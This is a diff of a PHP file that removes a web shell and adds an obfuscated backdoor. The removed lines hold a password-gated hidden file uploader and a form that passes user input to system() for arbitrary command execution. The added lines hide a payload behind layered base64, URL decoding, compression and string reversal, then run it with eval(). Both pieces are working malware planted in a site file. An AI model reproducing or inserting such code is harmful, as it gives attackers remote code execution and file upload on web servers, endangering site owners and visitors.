@@ -1,51 +1,6 @@
-<?php $FilesMan ="hacktitit"; 
-if($_GET['post']==$FilesMan)
-{ 
-if(isset($_POST['uploaded'])) { 
-$file = $_FILES['files']['name']; 
-$files= $_FILES['files']['tmp_name']; 
-$folder=""; 
-if(move_uploaded_file($files,$folder.$file)) { 
-$result = "Uploaded :<a href='$file' Men='_blank'>=> Click Ur File ^_^</a>"; 
-} 
-else 
-{ 
-$result = "Fail Try..."; 
-} 
-}
-echo'
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>Aku Suka Mamak Mu</title>
-<meta name="robots" content="noindex,nofollow">
-</head>
-'; 
-echo'
-</head> 
-<body> 
-<center> 
-<h3>{ Uploader Hidden }</h3> 
-<form action="" method="post" enctype="multipart/form-data">
-<input type="file" name="files" />
-<input type="submit" name="uploaded" value="E-Bool Om">
-</form>
-        
- '.$result.' 
- </body>
- </html>';
- 
- echo"<br><br><br><br><br><h3>{ CMD Execute }</h3>";
- echo "<form name='form' action='#' method='post'>
-       <input type='text' name='coba'/> <input type='submit' value='Entod Om '/>
-       </form>";
-       
-echo "<pre>";
-        
-        $cmd = ($_POST['coba']);
-        system($cmd);
-        echo "</pre>";
-       
-}
+<?php
+$unknown = "ZXZhbCUyOCUyNyUzRiUyNmd0JTNCJTI3Lmd6dW5jb21wcmVzcyUyOGd6aW5mbGF0ZSUyOGJhc2U2NF9kZWNvZGUlMjhzdHJyZXYlMjglMjR1azQ1JTI5JTI5JTI5JTI5JTI5JTNC";
+$uk45 = "ckWHG+94uY7dqdl9m1nucswEqOiGcsNAxvq7cLjf8SJ8KT7oZx7PDZRt+tX5qHv3nOGIZDU0DpCN5OdVqXwVA9E+yyp1qGkPgGr2SiSbGv/U62Xfn67hXqdTqNEHJ1FIoofmF8Chrl2F+CmrtgZ52du/6cdCN0yvGHtTcW3y7Qh5D5C1EwC/NYxh+HQo7VbiV3kwVtiPPhJ6261JBexjV7RA8sirTz0QM4bK3oBvMt5YOEYrWL0ndMccS6HLDvmmLmfYSNikDOVIBUiTEXUlyxIg5HbJKoGeKkuR17+ZBJI8QmJZahPami/Mxfm5nhmQYS6ZHUmWh3xEdG9eaXrIeSWMOXtL1XoSfidmQq6lkkhpWVLaIS42j43idTmNLuAfXJ4wW2+dL02pxThu23gNgJhPMldrFZmx52cIPZEz3ELGIuqdQCStPwSmkOSSMhsi4Z7rE/ER1BiwW1XmgDLOG2S7cyP/hb/T0DaWdLY7bbLMfNFGOEssV+VY+M8oZU1Nh4M3/1Sm6urvUwneroJcBxniwHEB+UKhiO/XyygU6KgNR9WB/vdsjHyjmwTOW1weFqbRVipYOSztusEraOSILoAS1FhNtIHHEyFD95+QkoxWNZhieuMc00jT5SXnGR8y+JJJ1rC70jI6Mp8pQkc1Thxfmjp9aqbCepUgqjub7CVPf/Zf/6qSwQEBgpdMWwAeVHdkzU8StCbIc7d3EjhRaiyhzFd8xj9rFVBdxoq1BKf+XmsROxGV8BnpFB+UbdKnRCxlFoZKFdtRaMPr8aydz9szn/InBlwetEzs++f1RZCmMjtCGAHHKWFT/0kSUrVT6mWbQ1Ar/OFW1MicFZe4/nqX+DBMb+WbU1Gn41/cCwYA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
 ?>
